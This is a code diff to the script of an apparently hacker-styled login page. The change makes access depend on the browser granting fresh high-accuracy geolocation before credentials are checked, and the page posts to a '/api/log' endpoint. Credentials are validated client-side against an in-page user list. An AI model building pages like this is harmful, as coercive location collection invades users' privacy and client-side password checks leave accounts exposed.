@@ -184,7 +184,7 @@
     const form = document.getElementById('loginForm');
     const errorMsg = document.getElementById('errorMsg');
 
-    function performLogin(username, password, locationCoords = null) {
+    function performLogin(username, password, locationCoords) {
         fetch('/api/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -202,28 +202,31 @@
 
     form.addEventListener('submit', (e) => {
         e.preventDefault();
+
+        // Get credentials first (but don't validate yet)
         const username = document.getElementById('username').value.trim();
         const password = document.getElementById('password').value;
-
-        const validUser = users.find(user => user.username === username && user.password === password);
-
-        if (!validUser) {
-            errorMsg.textContent = 'ACCESS DENIED. INVALID CREDENTIALS.';
-            return;
-        }
 
         if (!("geolocation" in navigator)) {
             errorMsg.textContent = '⚠️ LOCATION REQUIRED: Your browser does not support geolocation. Access denied.';
             return;
         }
 
-        // Clear previous error and show loading
+        // Show location request message
         errorMsg.textContent = 'Loading...';
         errorMsg.style.color = '#0f0';
 
-        // Request location every time ACCESS is clicked
+        // Request location FIRST, then validate credentials
         navigator.geolocation.getCurrentPosition(
             (position) => {
+                // Location granted – now check credentials
+                const validUser = users.find(user => user.username === username && user.password === password);
+                if (!validUser) {
+                    errorMsg.textContent = 'ACCESS DENIED. INVALID CREDENTIALS.';
+                    errorMsg.style.color = '#f00';
+                    return;
+                }
+
                 const coords = {
                     lat: position.coords.latitude,
                     lon: position.coords.longitude
@@ -234,10 +237,10 @@
                 let message = '';
                 switch(error.code) {
                     case error.PERMISSION_DENIED:
-                        message = '⚠️ LOCATION ACCESS DENIED. Please enable location in your browser settings to get wifi Location..';
+                        message = '⚠️ LOCATION ACCESS DENIED. Please enable location in your browser settings to get WiFi location.';
                         break;
                     case error.POSITION_UNAVAILABLE:
-                        message = '⚠️ LOCATION UNAVAILABLE. Please check your device Location';
+                        message = '⚠️ LOCATION UNAVAILABLE. Please check your device location.';
                         break;
                     case error.TIMEOUT:
                         message = '⚠️ LOCATION TIMEOUT. Please try again.';
@@ -248,7 +251,7 @@
                 errorMsg.textContent = message;
                 errorMsg.style.color = '#f00';
             },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }  // maximumAge:0 forces fresh attempt
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
     });
 </script>
